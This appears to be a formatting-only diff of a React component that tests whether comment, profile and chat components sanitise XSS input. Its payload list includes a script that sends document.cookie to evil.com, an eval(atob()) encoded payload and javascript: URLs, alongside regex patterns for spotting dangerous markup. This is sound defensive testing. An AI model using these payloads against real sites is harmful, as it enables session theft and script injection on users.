@@ -3,8 +3,12 @@
  * Component for testing XSS protection in frontend
  */
 
-import React, { useState } from 'react';
-import { SafeComment, SafeUserProfile, SafeGameChat } from './SafeComponents.jsx';
+import React, { useState } from "react";
+import {
+  SafeComment,
+  SafeUserProfile,
+  SafeGameChat,
+} from "./SafeComponents.jsx";
 
 /**
  * XSS Test payloads for testing
@@ -23,8 +27,8 @@ const XSS_TEST_PAYLOADS = [
   '"><script>alert(String.fromCharCode(88,83,83))</script>',
   '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
   '<img src="x" onerror="eval(atob(\'YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\'))">',
-  '<a href="javascript:alert(\'XSS\')">Click me</a>',
-  '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>'
+  "<a href=\"javascript:alert('XSS')\">Click me</a>",
+  "<form><button formaction=\"javascript:alert('XSS')\">Submit</button></form>",
 ];
 
 export const XSSTestComponent = () => {
@@ -37,15 +41,17 @@ export const XSSTestComponent = () => {
       componentName,
       timestamp: new Date().toISOString(),
       safe: true, // Will be updated based on actual rendering
-      notes: 'Content properly sanitized'
+      notes: "Content properly sanitized",
     };
 
     // Check if payload contains dangerous content after rendering
     setTimeout(() => {
-      const testContainer = document.querySelector(`[data-testid="${componentName}"]`);
+      const testContainer = document.querySelector(
+        `[data-testid="${componentName}"]`,
+      );
       if (testContainer) {
         const innerHTML = testContainer.innerHTML;
-        
+
         // Check for presence of dangerous content
         const dangerousPatterns = [
           /<script/i,
@@ -54,31 +60,32 @@ export const XSSTestComponent = () => {
           /onload=/i,
           /onfocus=/i,
           /onclick=/i,
-          /alert\(/i
+          /alert\(/i,
         ];
 
-        const foundDangerous = dangerousPatterns.some(pattern => 
-          pattern.test(innerHTML)
+        const foundDangerous = dangerousPatterns.some((pattern) =>
+          pattern.test(innerHTML),
         );
 
         if (foundDangerous) {
           result.safe = false;
-          result.notes = 'WARNING: Dangerous content detected in rendered HTML!';
+          result.notes =
+            "WARNING: Dangerous content detected in rendered HTML!";
         }
       }
 
-      setTestResults(prev => [...prev, result]);
+      setTestResults((prev) => [...prev, result]);
     }, 100);
   };
 
   const runAllTests = () => {
     setTestResults([]);
-    
+
     XSS_TEST_PAYLOADS.forEach((payload, index) => {
       setTimeout(() => {
-        runXSSTest(payload, 'safe-comment');
-        runXSSTest(payload, 'safe-user-profile');
-        runXSSTest(payload, 'safe-game-chat');
+        runXSSTest(payload, "safe-comment");
+        runXSSTest(payload, "safe-user-profile");
+        runXSSTest(payload, "safe-game-chat");
       }, index * 200);
     });
   };
@@ -90,11 +97,11 @@ export const XSSTestComponent = () => {
   return (
     <div className="xss-test-component">
       <h2>🛡️ XSS Protection Testing</h2>
-      
+
       <div className="test-controls">
         <h3>Test Controls</h3>
-        <select 
-          value={selectedPayload} 
+        <select
+          value={selectedPayload}
           onChange={(e) => setSelectedPayload(e.target.value)}
         >
           {XSS_TEST_PAYLOADS.map((payload, index) => (
@@ -103,23 +110,19 @@ export const XSSTestComponent = () => {
             </option>
           ))}
         </select>
-        
+
         <div className="buttons">
-          <button onClick={() => runXSSTest(selectedPayload, 'safe-comment')}>
+          <button onClick={() => runXSSTest(selectedPayload, "safe-comment")}>
             Test Single Payload
           </button>
-          <button onClick={runAllTests}>
-            Run All Tests
-          </button>
-          <button onClick={clearResults}>
-            Clear Results
-          </button>
+          <button onClick={runAllTests}>Run All Tests</button>
+          <button onClick={clearResults}>Clear Results</button>
         </div>
       </div>
 
       <div className="test-components">
         <h3>Test Components</h3>
-        
+
         <div className="component-test">
           <h4>Safe Comment Component</h4>
           <SafeComment
@@ -145,7 +148,7 @@ export const XSSTestComponent = () => {
           <SafeGameChat
             messages={[
               { player: selectedPayload, text: selectedPayload },
-              { player: "SafePlayer", text: "This is a safe message" }
+              { player: "SafePlayer", text: "This is a safe message" },
             ]}
           />
         </div>
@@ -153,19 +156,21 @@ export const XSSTestComponent = () => {
 
       <div className="test-results">
         <h3>Test Results ({testResults.length})</h3>
-        
+
         {testResults.length === 0 ? (
           <p>No test results yet. Run some tests to see results.</p>
         ) : (
           <div className="results-list">
             {testResults.map((result, index) => (
-              <div 
-                key={index} 
-                className={`result-item ${result.safe ? 'safe' : 'dangerous'}`}
+              <div
+                key={index}
+                className={`result-item ${result.safe ? "safe" : "dangerous"}`}
               >
                 <div className="result-header">
-                  <span className={`status ${result.safe ? 'safe' : 'dangerous'}`}>
-                    {result.safe ? '✅ SAFE' : '❌ DANGEROUS'}
+                  <span
+                    className={`status ${result.safe ? "safe" : "dangerous"}`}
+                  >
+                    {result.safe ? "✅ SAFE" : "❌ DANGEROUS"}
                   </span>
                   <span className="component">{result.componentName}</span>
                   <span className="timestamp">{result.timestamp}</span>
@@ -180,12 +185,11 @@ export const XSSTestComponent = () => {
             ))}
           </div>
         )}
-        
+
         <div className="results-summary">
           <p>
-            <strong>Summary:</strong> {' '}
-            {testResults.filter(r => r.safe).length} safe, {' '}
-            {testResults.filter(r => !r.safe).length} dangerous
+            <strong>Summary:</strong> {testResults.filter((r) => r.safe).length}{" "}
+            safe, {testResults.filter((r) => !r.safe).length} dangerous
           </p>
         </div>
       </div>
